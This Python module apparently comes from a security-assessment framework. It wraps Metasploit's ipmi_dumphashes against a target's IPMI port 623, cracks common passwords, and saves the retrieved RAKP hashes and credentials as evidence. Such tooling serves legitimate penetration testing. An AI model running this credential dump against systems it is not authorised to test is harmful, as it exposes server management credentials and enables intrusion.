from __future__ import annotations

from pathlib import Path

from ..context import ScanContext
from ..core.errors import ToolMissingError
from ..tools.metasploit import MetasploitTool
from .hash_parsers import parse_msf_dumphashes


class RakpDumper:
    """Orchestrates RAKP hash retrieval via Metasploit ipmi_dumphashes."""

    def __init__(self, msf_tool: MetasploitTool) -> None:
        self._msf = msf_tool

    def run(self, context: ScanContext, user_file: Path | None = None) -> None:
        target = context.target
        hashcat_file = context.hashes_path("ipmi_hashcat.txt")
        john_file = context.hashes_path("ipmi_john.txt")
        stdout_path = context.raw_path("msf_ipmi_dumphashes.stdout.txt")
        stderr_path = context.raw_path("msf_ipmi_dumphashes.stderr.txt")

        try:
            result = self._msf.run_dumphashes(
                target=target,
                port=623,
                user_file=user_file,
                hashcat_file=hashcat_file,
                john_file=john_file,
                crack_common=True,
                stdout_path=stdout_path,
                stderr_path=stderr_path,
            )
        except ToolMissingError as e:
            context.skip_step("rakp_dump", f"msfconsole not available: {e}")
            return

        context.add_evidence(str(stdout_path))

        hashes, creds = parse_msf_dumphashes(result.stdout, target)
        context.hashes.extend(hashes)
        context.credentials.extend(creds)

        if hashcat_file.exists():
            context.add_evidence(str(hashcat_file))
        if john_file.exists():
            context.add_evidence(str(john_file))
